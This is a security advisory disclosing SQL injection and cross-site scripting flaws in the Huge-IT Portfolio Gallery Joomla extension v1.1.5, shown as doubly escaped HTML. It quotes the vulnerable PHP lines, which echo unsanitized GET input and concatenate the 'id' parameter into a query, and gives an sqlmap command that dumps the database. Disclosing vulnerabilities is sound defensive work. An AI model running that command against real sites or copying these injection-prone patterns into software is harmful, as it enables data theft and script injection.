<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title></title>
<meta name="generator" content="HTML::TextToHTML v2.51"/>
</head>
<body>
<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
    white-space: -moz-pre-wrap; /</em> Firefox <em>/
    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
    white-space: -o-pre-wrap;   /</em> Opera 7 */
    word-wrap: break-word;<br/>
}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 165&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Huge-IT Portfolio Gallery manager v1.1.5 SQL Injection and XSS&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2016-07-15&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://huge-it.com/joomla-portfolio-gallery/">http://huge-it.com/joomla-portfolio-gallery/</a>"&gt;<a href="http://huge-it.com/joomla-portfolio-gallery/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://huge-it.com/joomla-portfolio-gallery/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Huge IT&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2016-07-16&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:info@huge-it.com">info@huge-it.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Huge-IT Portfolio Gallery extension can do wonders with your website. If you wish to show your photos, videos, enclosing the additional images and videos, then this Portfolio Gallery extension is what you need.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The attacker must be logged in with at least manager level access or access to the administrative panel to exploit this vulnerability:
</p><p>XSS line 156 in : ./administrator/components/com_portfoliogallery/views/video/tmpl/default.php
</p><pre>
155                         &amp;lt;textarea rows=&amp;quot;3&amp;quot; cols=&amp;quot;50&amp;quot; class=&amp;quot;text-area&amp;quot; disab    led &amp;gt;
156                     &amp;lt;?php echo $_GET[&amp;#039;edit&amp;#039;];?&amp;gt;
157                         &amp;lt;/textarea&amp;gt;</pre>

<p>In file administrator/components/com_portfoliogallery/models/portfoliogallery.php:  
</p><p>variable id is passed without any sanitization to the SQL query being built starting at line 53:
</p><pre>
 50     public function getPropertie() {
 51         $db = JFactory::getDBO();
 52         $id_cat = JRequest::getVar(&amp;#039;id&amp;#039;);
 53         $query = $db-&amp;gt;getQuery(true);
 54         $query-&amp;gt;select(&amp;#039;<strong>__huge_itportfolio_images.name as name,&amp;</strong>039;
 55                 . &amp;#039;<strong>__huge_itportfolio_images.id ,&amp;</strong>039;
 56                 . &amp;#039;<strong>__huge_itportfolio_portfolios.name as portName,&amp;</strong>039;
 57                 . &amp;#039;portfolio_id,#__huge_itportfolio_images.category as categ    ory, <strong>__huge_itportfolio_images.description as description,image_url,sl_url,    sl_type,link_target,</strong>__huge_itportfolio_images.ordering,<strong>__huge_itportfolio_    images.published,published_in_sl_width&amp;</strong>039;);
 58         $query-&amp;gt;from(array(&amp;#039;<strong>__huge_itportfolio_portfolios&amp;</strong>039; =&amp;gt; &amp;#039;<strong>__huge_itpo    rtfolio_portfolios&amp;</strong>039;, &amp;#039;<strong>__huge_itportfolio_images&amp;</strong>039; =&amp;gt; &amp;#039;<strong>__huge_itportfolio_im    ages&amp;</strong>039;));
 59         $query-&amp;gt;where(&amp;#039;<strong>__huge_itportfolio_portfolios.id = portfolio_id&amp;</strong>039;)-&amp;gt;w    here(&amp;#039;portfolio_id=&amp;#039; . $id_cat);
 60         $query-&amp;gt;order(&amp;#039;ordering asc&amp;#039;);
 61         $db-&amp;gt;setQuery($query);
 62         $results = $db-&amp;gt;loadObjectList();
 63         return $results;
</pre>
<p>&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2016-1000115 2016-1000116&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=165"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;sqlmap  &lt;span style="color: #339933;"&gt;--&lt;/span&gt;load&lt;span style="color: #339933;"&gt;-&lt;/span&gt;cookies&lt;span style="color: #339933;"&gt;=&lt;/span&gt;cookies&lt;span style="color: #339933;"&gt;.&lt;/span&gt;txt &lt;span style="color: #339933;"&gt;-&lt;/span&gt;u &lt;span style="color: #0000ff;"&gt;&amp;quot;<a href="http://192.168.0.125/administrator/index.php?option=com_portfoliogallery&amp;amp;view=portfoliogallery&amp;amp;id">http://192.168.0.125/administrator/index.php?option=com_portfoliogallery&amp;amp;view=portfoliogallery&amp;amp;id</a>=*&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;dbms &lt;a href="<a href="http://www.php.net/mysql">http://www.php.net/mysql</a>"&gt;&lt;span style="color: #990000;"&gt;mysql&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;dump&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href=""&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt;
&lt;/html&gt;
</p>

</body>
</html>
